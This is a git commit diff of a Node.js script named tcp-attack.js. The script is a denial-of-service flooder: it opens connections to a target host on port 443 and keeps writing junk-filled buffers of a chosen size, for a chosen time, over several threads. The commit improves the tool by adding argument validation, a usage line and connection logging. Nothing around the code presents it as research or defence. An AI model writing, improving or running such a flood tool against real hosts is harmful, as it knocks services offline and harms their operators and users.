bcb2c701d53c718f748fe118c1248569b4f052ae
ZanMoon <157574781+ZanMoon@users.noreply.github.com>
2024-09-03 05:11:42 +0700

    Update tcp-attack.js

--- tcp-attack.js
+++ tcp-attack.js
@@ -1,14 +1,20 @@
 const net = require('net');
 const [,, host, time, packetSize, threads] = process.argv;
 
-const duration = parseInt(time) * 1000;
-const size = parseInt(packetSize);
-const numThreads = parseInt(threads);
+if (!host || isNaN(time) || isNaN(packetSize) || isNaN(threads)) {
+  console.error('Usage: node tcp-attack.js <host> <time> <packetSize> <threads>');
+  process.exit(1);
+}
+
+const duration = parseInt(time, 10) * 1000;
+const size = parseInt(packetSize, 10);
+const numThreads = parseInt(threads, 10);
 
 function createTCPAttack() {
   const client = new net.Socket();
   
   client.connect(443, host, () => {
+    console.log(`Connected to ${host} on port 443`);
     const interval = setInterval(() => {
       const data = Buffer.alloc(size, 'X');
       client.write(data);
@@ -22,6 +28,10 @@ function createTCPAttack() {
 
   client.on('error', (err) => {
     console.error(`Error: ${err.message}`);
+  });
+
+  client.on('close', () => {
+    console.log('Connection closed');
   });
 }
 
